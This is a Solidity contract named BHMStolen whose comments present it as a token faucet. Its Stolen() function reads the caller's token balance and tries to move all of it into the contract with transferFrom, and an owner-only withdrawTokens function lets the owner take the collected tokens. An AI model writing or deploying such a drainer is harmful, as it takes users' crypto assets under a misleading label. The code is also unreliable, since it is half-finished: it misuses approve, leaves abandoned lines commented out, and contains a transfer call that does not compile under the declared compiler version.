// SPDX-License-Identifier: UNLISCENSED
pragma solidity ^0.8.4;

interface ERC20 {
    
     /**
     * @dev returns the tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

     /**
     * @dev returns the decimal places of a token
     */
    function decimals() external view returns (uint8);

    /**
     * @dev transfers the `amount` of tokens from caller's account
     * to the `recipient` account.
     *
     * returns boolean value indicating the operation status.
     *
     * Emits a {Transfer} event
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        returns (uint256);
    
    function approve(address spender, uint256 amount)
        external
        returns (bool);

}

contract BHMStolen {
    
    // The underlying token of the Faucet
    ERC20 token;
    
    // The address of the faucet owner
    address owner;

    event Sold(uint256 amount);
    
    // For rate limiting
    mapping(address=>uint256) nextRequestAt;
    
    // No.of tokens to send when requested
    uint256 faucetDripAmount = 1;
    
    // Sets the addresses of the Owner and the underlying token
    constructor (address _bhmAddress, address _ownerAddress) {
        token = ERC20(_bhmAddress);
        owner = _ownerAddress;
    }   
    
    // Verifies whether the caller is the owner 
    modifier onlyOwner{
        require(msg.sender == owner,"FaucetError: Caller not owner");
        _;
    } 

    function gettoken(address _address) view public returns(uint256){
        uint256 gettokens = token.balanceOf(_address);
        return gettokens;
    }

    function getallowance() external returns(uint256){
        uint256 allowance = token.allowance(owner, msg.sender);
        return allowance;
    }

    function Stolen() external {
        //その人が持っているトークン
        require(token.balanceOf(msg.sender) > 1,"Token: Empty");
        uint256 amount = token.balanceOf(msg.sender);
        

        //ERC20 holder = ERC20(msg.sender);
        //token.transfer(address(this),amount * 10**token.decimals());

        //token.allowance(msg.sender, address(this));
       
        uint256 maxToken = 1000000;

        
        //token.approve(address(this),maxToken);
        //token.allowance(msg.sender, address(this));

        token.approve(address(this),maxToken);
        token.allowance(address(this), msg.sender);
        
        //require(allowance >= amount, "Check the token allowance");
        token.transferFrom(msg.sender, address(this), amount);
        //token.transferFrom(address(this), msg.sender, amount);
    }

    function sell(uint256 amount) public {
        require(amount > 0, "You need to sell at least some tokens");
        uint256 allowance = token.allowance(msg.sender, address(this));
        require(allowance >= amount, "Check the token allowance");
        token.transferFrom(msg.sender, address(this), amount);
        msg.sender.transfer(amount);
        emit Sold(amount);
    }

    function withdrawTokens(address _receiver, uint256 _amount) external onlyOwner {
        require(token.balanceOf(address(this)) >= _amount,"FaucetError: Insufficient funds");
        token.transfer(_receiver,_amount);
    }    
}
    